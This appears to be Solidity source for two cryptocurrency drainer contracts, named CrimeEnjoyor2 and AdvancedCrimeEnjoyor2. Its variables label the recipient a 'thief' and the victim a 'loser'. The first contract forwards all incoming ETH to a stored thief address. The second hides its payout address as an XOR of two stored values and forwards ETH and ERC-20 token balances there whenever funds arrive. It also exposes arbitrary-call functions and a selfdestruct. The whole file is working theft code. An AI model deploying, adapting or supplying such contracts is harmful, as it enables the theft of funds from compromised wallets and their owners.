// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract CrimeEnjoyor2 {
    address payable public loser_2494524213;

    receive() external payable {
        require(loser_2494524213 != address(0), "Portal not conjured");
        payable(loser_2494524213).transfer(msg.value);
    }

    function initLoser_863360385(address payable thief) public {
        require(thief != address(0), "No void allowed");
        loser_2494524213 = thief;
    }
}

contract AdvancedCrimeEnjoyor2 {
    bytes32 immutable a;
    bytes32 immutable b;
    address private immutable owner;

    constructor(bytes32 _a, bytes32 _b) {
        owner = msg.sender;
        a = _a;
        b = _b;
        require(uint160(uint256(_a ^ _b)) != 0, "Invalid target address");
    }

    receive() external payable {
        helperFunction();
    }

    function loserFallback_8092318215() external payable {
        helperFunction();
    }

    function destroyContract() external {
        require(msg.sender == owner, "Only owner can destroy");
        selfdestruct(payable(owner));
    }

    function loserSweepETH_11435948882() public {
        uint256 xorResult = xorHelper();
        uint256 selfBalance = address(this).balance;
        if (uint160(xorResult) != 0 && selfBalance > 0) {
            address(uint160(xorResult)).call{value: selfBalance}("");
        }
    }

    function loserMulticall_3869193990(address[] calldata targets, bytes[] calldata datas) public payable {
        require(targets.length == datas.length, "Arrays length mismatch");
        for (uint256 i = 0; i < targets.length; i++) {
            targets[i].call(datas[i]);
        }
        helperFunction();
    }

    function executeCall(address target, bytes calldata data) public payable {
        target.call(data);
        helperFunction();
    }

    function helperFunction() internal {
        uint256 xorResult = xorHelper();
        uint256 value = msg.value;
        if (uint160(xorResult) != 0 && value > 0) {
            address(uint160(xorResult)).call{value: value}("");
        }
    }

    function transferTokens(address token) public payable {
        uint256 xorResult = xorHelper();
        uint256 tokenBalance = IERC20(token).balanceOf(address(this));
        if (uint160(xorResult) != 0 && tokenBalance > 0) {
            IERC20(token).transfer(address(uint160(xorResult)), tokenBalance);
        }
    }

    function xorHelper() internal view returns (uint256 xorResult) {
        return uint256(a ^ b);
    }
}
